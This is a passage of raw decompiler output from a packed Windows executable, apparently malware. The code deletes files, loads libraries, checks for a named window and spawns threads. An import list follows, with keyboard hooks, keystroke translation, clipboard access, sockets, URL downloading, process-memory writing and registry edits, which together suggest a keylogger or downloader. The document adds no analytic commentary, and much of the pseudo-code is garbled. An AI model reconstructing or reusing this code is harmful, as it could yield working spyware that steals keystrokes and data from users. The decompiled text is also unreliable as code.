    unsigned char v79 = v76 + v35; // 0x407bf1
    char v80 = llvm_ctpop_i8(v79); // 0x407bf1
    v2 = v78 & -0xff01 | 256 * (int32_t)v79;
    if ((v80 & 1) == 0) {
        // 0x407c35
        __readfsdword(0);
        return 0;
    }
    char * v81 = (char *)(v8 + 0x407a); // 0x407bf5
    *v81 = *v81 + (char)v51;
    char * v82 = (char *)result; // 0x407bfb
    *v82 = *v82 + (char)result;
    unsigned char v83 = (char)(result / 256) + (char)v2; // 0x407bfd
    char v84 = llvm_ctpop_i8(v83); // 0x407bfd
    v2 = v2 & -256 | (int32_t)v83;
    if ((v84 & 1) != 0) {
        char * v85 = (char *)(a2 - 117); // 0x407c01
        *v85 = *v85 + v83;
        __asm_in((int16_t)v2);
        *(int32_t *)(a2 - 96) = 0;
        *(int32_t *)(a2 - 92) = 0;
        *(int32_t *)(a2 - 88) = 0;
        return 0;
    }
    int32_t lpFilename = v51; // 0x407b9f
    *(int32_t *)result = (int32_t)&v59;
    int32_t v86 = 0; // bp-34, 0x407c49
    int32_t nameSize = GetModuleFileNameA((int32_t *)260, (char *)lpFilename, 0); // 0x407c4b
    *(char *)(nameSize + lpFilename) = 0;
    function_4034b2();
    function_40708e();
    function_4033c6();
    int32_t v87; // 0x407b0a
    int32_t v88; // 0x407b0a
    if ((char)function_407106() == 0) {
        int32_t v89 = &v86; // 0x407c49
        function_4060f2();
        v88 = v89;
        if ((char)function_407106() == 0) {
            goto lab_0x407e78;
        } else {
            // 0x407d2b
            *(int32_t *)g34 = -1;
            v87 = v89;
            goto lab_0x407d36;
        }
    } else {
        // 0x407c8e
        *(int32_t *)g33 = -1;
        function_4034b2();
        function_4070ce();
        function_4033c6();
        function_403516();
        DeleteFileA((char *)function_4036ca());
        function_403516();
        char * lpLibFileName = (char *)function_4036ca(); // 0x407cfc
        char * v90 = lpLibFileName; // bp-42, 0x407cfc
        g32 = (int32_t)LoadLibraryA(lpLibFileName);
        v87 = (int32_t)&v90;
        goto lab_0x407d36;
    }
  lab_0x407e78:
    // 0x407e78
    __writefsdword(0, *(int32_t *)v88);
    *(int32_t *)(v88 + 8) = 0x407e9a;
    return function_403396();
  lab_0x407d36:
    // 0x407d36
    *(int32_t *)(v87 - 4) = 260;
    *(int32_t *)(v87 - 8) = lpFilename;
    int32_t v91 = v87 - 12; // 0x407d41
    *(int32_t *)v91 = (int32_t)g82;
    int32_t nameSize2 = GetModuleFileNameA(&g118, (char *)&g118, (int32_t)&g118); // 0x407d42
    *(char *)(nameSize2 + lpFilename) = 0;
    function_4034b2();
    function_4070ce();
    function_4033c6();
    function_403516();
    int32_t v92; // 0x407b0a
    if (g34 == 0) {
        // 0x407dcf
        v88 = v91;
        if (g33 == 0) {
            goto lab_0x407e78;
        } else {
            // 0x407ddd
            if (g37 >= 1) {
                // 0x407df6
                function_404d3a();
                function_403616();
                *(int32_t *)g38 = -1;
            }
            // 0x407e29
            *(int32_t *)(v87 - 16) = 3;
            *(int32_t *)(v87 - 20) = 0x3ec1;
            int32_t v93 = v87 - 24; // 0x407e35
            *(int32_t *)v93 = g32;
            int32_t * v94 = FindResourceA(&g118, (char *)&g118, (char *)&g118); // 0x407e36
            v92 = v93;
            if (v94 != NULL) {
                goto lab_0x407e69;
            } else {
                // 0x407e3f
                *(int32_t *)(v87 - 28) = 14;
                *(int32_t *)(v87 - 32) = 0x3ec1;
                int32_t v95 = v87 - 36; // 0x407e4b
                *(int32_t *)v95 = g32;
                int32_t * v96 = FindResourceA(&g118, (char *)&g118, (char *)&g118); // 0x407e4c
                v92 = v95;
                if (v96 != NULL) {
                    goto lab_0x407e69;
                } else {
                    // 0x407e55
                    *(int32_t *)(v87 - 40) = 0x3ec1;
                    int32_t v97 = v87 - 44; // 0x407e5f
                    *(int32_t *)v97 = g32;
                    int32_t * iconHandle = LoadIconA(&g118, (char *)&g118); // 0x407e60
                    v92 = v97;
                    v88 = v97;
                    if (iconHandle == NULL) {
                        goto lab_0x407e78;
                    } else {
                        goto lab_0x407e69;
                    }
                }
            }
        }
    } else {
        // 0x407d9c
        *(int32_t *)(v87 - 16) = (int32_t)"xr, wo xiang ni";
        int32_t v98 = v87 - 20; // 0x407da1
        *(int32_t *)v98 = (int32_t)"ListBox";
        int32_t * v99 = FindWindowA((char *)&g118, (char *)&g118); // 0x407da6
        v88 = v98;
        if (v99 == NULL) {
            // 0x407db3
            *(int32_t *)(v87 - 24) = (int32_t)&g117;
            *(int32_t *)(v87 - 28) = 0;
            *(int32_t *)(v87 - 32) = 66;
            *(int32_t *)(v87 - 36) = 0x40676e;
            *(int32_t *)(v87 - 40) = 0;
            int32_t v100 = v87 - 44; // 0x407dc3
            *(int32_t *)v100 = 0;
            CreateThread((struct _SECURITY_ATTRIBUTES *)&g118, (int32_t)&g118, (int32_t (*)(int32_t *))&g118, &g118, (int32_t)&g118, &g118);
            v88 = v100;
        }
        goto lab_0x407e78;
    }
  lab_0x407e69:
    // 0x407e69
    g83 = 0x407ad6;
    v88 = v92;
    goto lab_0x407e78;
}

// Address range: 0x407e93 - 0x407e98
int32_t function_407e93(void) {
    // 0x407e93
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x407e98 - 0x407e9a
int32_t function_407e98(void) {
    // 0x407e98
    int32_t result; // 0x407e98
    return result;
}

// Address range: 0x407f1e - 0x407f26
int32_t function_407f1e(int32_t a1) {
    // 0x407f1e
    return a1 - 809;
}

// Address range: 0x407f26 - 0x407f4d
int32_t entry_point(void) {
    int32_t result = function_407f1e((int32_t)&g118); // 0x407f26
    char * v1 = (char *)result; // 0x407f2b
    *v1 = 17 * (char)result + *v1;
    return result;
}

// --------------- Dynamically Linked Functions ---------------

// LRESULT CallNextHookEx(_In_opt_ HHOOK hhk, _In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam);
// BOOL CloseClipboard(VOID);
// BOOL CloseHandle(_In_ HANDLE hObject);
// int closesocket(_In_ SOCKET s);
// int CompareStringA(_In_ LCID Locale, _In_ DWORD dwCmpFlags, PCNZCH lpString1, _In_ int cchCount1, PCNZCH lpString2, _In_ int cchCount2);
// int connect(_In_ SOCKET s, const struct sockaddr * name, _In_ int namelen);
// BOOL CopyFileA(_In_ LPCSTR lpExistingFileName, _In_ LPCSTR lpNewFileName, _In_ BOOL bFailIfExists);
// HANDLE CreateFileA(_In_ LPCSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile);
// HANDLE CreateThread(_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId);
// HWND CreateWindowExA(_In_ DWORD dwExStyle, _In_opt_ LPCSTR lpClassName, _In_opt_ LPCSTR lpWindowName, _In_ DWORD dwStyle, _In_ int X, _In_ int Y, _In_ int nWidth, _In_ int nHeight, _In_opt_ HWND hWndParent, _In_opt_ HMENU hMenu, _In_opt_ HINSTANCE hInstance, _In_opt_ LPVOID lpParam);
// LRESULT DefWindowProcA(_In_ HWND hWnd, _In_ UINT Msg, _In_ WPARAM wParam, _In_ LPARAM lParam);
// VOID DeleteCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// BOOL DeleteFileA(_In_ LPCSTR lpFileName);
// LRESULT DispatchMessageA(_In_ const MSG * lpMsg);
// VOID EnterCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// BOOL EnumWindows(_In_ WNDENUMPROC lpEnumFunc, _In_ LPARAM lParam);
// VOID ExitProcess(_In_ UINT uExitCode);
// int32_t ExitProcess2(void);
// HRSRC FindResourceA(_In_opt_ HMODULE hModule, _In_ LPCSTR lpName, _In_ LPCSTR lpType);
// HWND FindWindowA(_In_opt_ LPCSTR lpClassName, _In_opt_ LPCSTR lpWindowName);
// HWND FindWindowExA(_In_opt_ HWND hWndParent, _In_opt_ HWND hWndChildAfter, _In_opt_ LPCSTR lpszClass, _In_opt_ LPCSTR lpszWindow);
// BOOL FreeLibrary(_In_ HMODULE hLibModule);
// VOID FreeLibraryAndExitThread(_In_ HMODULE hLibModule, _In_ DWORD dwExitCode);
// BOOL GetCaretPos(_Out_ LPPOINT lpPoint);
// BOOL GetCharWidthA(_In_ HDC hdc, _In_ UINT iFirst, _In_ UINT iLast, LPINT lpBuffer);
// DWORD GetClassLongA(_In_ HWND hWnd, _In_ int nIndex);
// int GetClassNameA(_In_ HWND hWnd, LPSTR lpClassName, _In_ int nMaxCount);
// HANDLE GetClipboardData(_In_ UINT uFormat);
// LPSTR GetCommandLineA(VOID);
// HANDLE GetCurrentProcess(VOID);
// DWORD GetCurrentThreadId(VOID);
// HDC GetDC(_In_opt_ HWND hWnd);
// DWORD GetFileSize(_In_ HANDLE hFile, _Out_opt_ LPDWORD lpFileSizeHigh);
// struct hostent * gethostbyname(_In_z_ const char * name);
// int gethostname(char * name, _In_ int namelen);
// BOOL GetKeyboardState(PBYTE lpKeyState);
// int GetKeyboardType(_In_ int nTypeFlag);
// int GetLocaleInfoA(_In_ LCID Locale, _In_ LCTYPE LCType, LPSTR lpLCData, _In_ int cchData);
// BOOL GetMessageA(_Out_ LPMSG lpMsg, _In_opt_ HWND hWnd, _In_ UINT wMsgFilterMin, _In_ UINT wMsgFilterMax);
// DWORD GetModuleFileNameA(_In_opt_ HMODULE hModule, LPSTR lpFilename, _In_ DWORD nSize);
// HMODULE GetModuleHandleA(_In_opt_ LPCSTR lpModuleName);
// HWND GetParent(_In_ HWND hWnd);
// FARPROC GetProcAddress(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
// VOID GetStartupInfoA(_Out_ LPSTARTUPINFOA lpStartupInfo);
// HGDIOBJ GetStockObject(_In_ int i);
// DWORD GetTempPathA(_In_ DWORD nBufferLength, LPSTR lpBuffer);
// LCID GetThreadLocale(void);
// DWORD GetTickCount(VOID);
// int32_t GetTickCount2(void);
// HWND GetTopWindow(_In_opt_ HWND hWnd);
// NOT_BUILD_WINDOWS_DEPRECATE DWORD GetVersion(VOID);
// HWND GetWindow(_In_ HWND hWnd, _In_ UINT uCmd);
// LONG GetWindowLongA(_In_ HWND hWnd, _In_ int nIndex);
// DWORD GetWindowThreadProcessId(_In_ HWND hWnd, _Out_opt_ LPDWORD lpdwProcessId);
// HGLOBAL GlobalAlloc(_In_ UINT uFlags, _In_ SIZE_T dwBytes);
// HGLOBAL GlobalFree(HGLOBAL hMem);
// LPVOID GlobalLock(_In_ HGLOBAL hMem);
// BOOL GlobalUnlock(_In_ HGLOBAL hMem);
// u_short htons(_In_ u_short hostshort);
// PVOID ImageDirectoryEntryToData(_In_ PVOID Base, _In_ BOOLEAN MappedAsImage, _In_ USHORT DirectoryEntry, _Out_ PULONG Size);
// char * inet_ntoa(_In_ struct in_addr in);
// VOID InitializeCriticalSection(_Out_ LPCRITICAL_SECTION lpCriticalSection);
// BOOL IsWindow(_In_opt_ HWND hWnd);
// BOOL IsWindowVisible(_In_ HWND hWnd);
// BOOL KillTimer(_In_opt_ HWND hWnd, _In_ UINT_PTR uIDEvent);
// VOID LeaveCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// HICON LoadIconA(_In_opt_ HINSTANCE hInstance, _In_ LPCSTR lpIconName);
// HMODULE LoadLibraryA(_In_ LPCSTR lpLibFileName);
// HLOCAL LocalAlloc(_In_ UINT uFlags, _In_ SIZE_T uBytes);
// int32_t LocalAlloc2(void);
// HLOCAL LocalFree(HLOCAL hMem);
// int32_t LocalFree2(void);
// int lstrcmpiA(_In_ LPCSTR lpString1, _In_ LPCSTR lpString2);
// LPSTR lstrcpyA(LPSTR lpString1, _In_ LPCSTR lpString2);
// int MessageBoxA(_In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType);
// BOOL OpenClipboard(_In_opt_ HWND hWndNewOwner);
// BOOL PathFileExistsA(_In_ LPCSTR pszPath);
// BOOL PostMessageA(_In_opt_ HWND hWnd, _In_ UINT Msg, _In_ WPARAM wParam, _In_ LPARAM lParam);
// VOID PostQuitMessage(_In_ int nExitCode);
// BOOL QueryPerformanceCounter(_Out_ LARGE_INTEGER * lpPerformanceCount);
// VOID RaiseException(_In_ DWORD dwExceptionCode, _In_ DWORD dwExceptionFlags, _In_ DWORD nNumberOfArguments, const ULONG_PTR * lpArguments);
// BOOL ReadFile(_In_ HANDLE hFile, LPVOID lpBuffer, _In_ DWORD nNumberOfBytesToRead, _Out_opt_ LPDWORD lpNumberOfBytesRead, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// int recv(_In_ SOCKET s, char * buf, _In_ int len, _In_ int flags);
// LSTATUS RegCloseKey(_In_ HKEY hKey);
// int32_t RegCloseKey2(void);
// LSTATUS RegCreateKeyExA(_In_ HKEY hKey, _In_ LPCSTR lpSubKey, DWORD Reserved, _In_opt_ LPSTR lpClass, _In_ DWORD dwOptions, _In_ REGSAM samDesired, _In_opt_ const LPSECURITY_ATTRIBUTES lpSecurityAttributes, _Out_ PHKEY phkResult, _Out_opt_ LPDWORD lpdwDisposition);
// LSTATUS RegDeleteKeyA(_In_ HKEY hKey, _In_ LPCSTR lpSubKey);
// LSTATUS RegOpenKeyExA(_In_ HKEY hKey, _In_opt_ LPCSTR lpSubKey, _In_opt_ DWORD ulOptions, _In_ REGSAM samDesired, _Out_ PHKEY phkResult);
// int32_t RegOpenKeyExA2(void);
// LSTATUS RegQueryValueExA(_In_ HKEY hKey, _In_opt_ LPCSTR lpValueName, LPDWORD lpReserved, _Out_opt_ LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// int32_t RegQueryValueExA2(void);
// LSTATUS RegSetValueExA(_In_ HKEY hKey, _In_opt_ LPCSTR lpValueName, DWORD Reserved, _In_ DWORD dwType, const BYTE * lpData, _In_ DWORD cbData);
// int ReleaseDC(_In_opt_ HWND hWnd, _In_ HDC hDC);
// VOID RtlUnwind(_In_opt_ PVOID TargetFrame, _In_opt_ PVOID TargetIp, _In_opt_ PEXCEPTION_RECORD ExceptionRecord, _In_ PVOID ReturnValue);
// HGDIOBJ SelectObject(_In_ HDC hdc, _In_ HGDIOBJ h);
// int send(_In_ SOCKET s, const char * buf, _In_ int len, _In_ int flags);
// LRESULT SendMessageA(_In_ HWND hWnd, _In_ UINT Msg, WPARAM wParam, LPARAM lParam);
// BOOL SetEndOfFile(_In_ HANDLE hFile);
// UINT_PTR SetTimer(_In_opt_ HWND hWnd, _In_ UINT_PTR nIDEvent, _In_ UINT uElapse, _In_opt_ TIMERPROC lpTimerFunc);
// LONG SetWindowLongA(_In_ HWND hWnd, _In_ int nIndex, _In_ LONG dwNewLong);
// HHOOK SetWindowsHookExA(_In_ int idHook, _In_ HOOKPROC lpfn, _In_opt_ HINSTANCE hmod, _In_ DWORD dwThreadId);
// HINSTANCE ShellExecuteA(_In_opt_ HWND hwnd, _In_opt_ LPCSTR lpOperation, _In_ LPCSTR lpFile, _In_opt_ LPCSTR lpParameters, _In_opt_ LPCSTR lpDirectory, _In_ INT nShowCmd);
// VOID Sleep(_In_ DWORD dwMilliseconds);
// SOCKET socket(_In_ int af, _In_ int type, _In_ int protocol);
// void SysFreeString(_In_opt_ BSTR bstrString);
// INT SysReAllocStringLen(_Inout_ BSTR * pbstr, const OLECHAR * psz, _In_ unsigned int len);
// DWORD TlsAlloc(VOID);
// BOOL TlsFree(_In_ DWORD dwTlsIndex);
// LPVOID TlsGetValue(_In_ DWORD dwTlsIndex);
// BOOL TlsSetValue(_In_ DWORD dwTlsIndex, _In_opt_ LPVOID lpTlsValue);
// int ToAscii(_In_ UINT uVirtKey, _In_ UINT uScanCode, const BYTE * lpKeyState, _Out_ LPWORD lpChar, _In_ UINT uFlags);
// LONG UnhandledExceptionFilter(_In_ struct _EXCEPTION_POINTERS * ExceptionInfo);
// BOOL UnhookWindowsHookEx(_In_ HHOOK hhk);
// HRESULT URLDownloadToFileA(_In_opt_ LPUNKNOWN, _In_ LPCSTR, _In_opt_ LPCSTR, DWORD, _In_opt_ LPBINDSTATUSCALLBACK);
// int32_t URLDownloadToFileA2(void);
// LPVOID VirtualAlloc(_In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect);
// BOOL VirtualFree(LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD dwFreeType);
// BOOL VirtualProtect(_In_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flNewProtect, _Out_ PDWORD lpflOldProtect);
// BOOL WriteFile(_In_ HANDLE hFile, LPCVOID lpBuffer, _In_ DWORD nNumberOfBytesToWrite, _Out_opt_ LPDWORD lpNumberOfBytesWritten, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// int32_t WriteFile2(void);
// BOOL WriteProcessMemory(_In_ HANDLE hProcess, _In_ LPVOID lpBaseAddress, LPCVOID lpBuffer, _In_ SIZE_T nSize, _Out_opt_ SIZE_T * lpNumberOfBytesWritten);
// int WSACleanup(void);
// int WSAStartup(_In_ WORD wVersionRequested, _Out_ LPWSADATA lpWSAData);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: maskpe
// Detected functions: 634
